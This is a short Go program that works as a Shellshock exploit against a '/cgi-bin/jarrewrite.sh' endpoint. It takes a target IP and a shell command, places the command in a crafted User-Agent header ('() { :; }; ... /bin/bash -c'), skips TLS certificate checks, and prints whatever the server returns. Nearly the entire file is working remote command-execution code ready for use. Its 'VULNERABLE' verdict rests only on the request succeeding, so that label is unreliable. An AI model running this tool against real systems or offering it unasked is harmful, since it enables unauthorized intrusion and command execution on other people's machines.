package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/gookit/color"
)

func main() {

	ipPtr := flag.String("i", "", "target ip")
	cmdPtr := flag.String("c", "echo", "Commands: e.g ifconfig, id, etc.")

	flag.Parse()

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("GET", "https://"+*ipPtr+"/cgi-bin/jarrewrite.sh", nil)
	if err != nil {

	}

	req.Host = *ipPtr
	req.Header.Set("User-Agent", "() { :; }; echo ; /bin/bash -c '"+*cmdPtr+"'")
	req.Header.Set("Connection", "close")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("Accept-Encoding", "gzip, deflate")

	resp, err := client.Do(req)
	if err != nil {
		color.Red.Println(*ipPtr, "[NOT VULNERABLE] \n")
		return
	} else {
		color.Green.Print(*ipPtr, " [VULNERABLE] ")
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("%s\n", body)
}
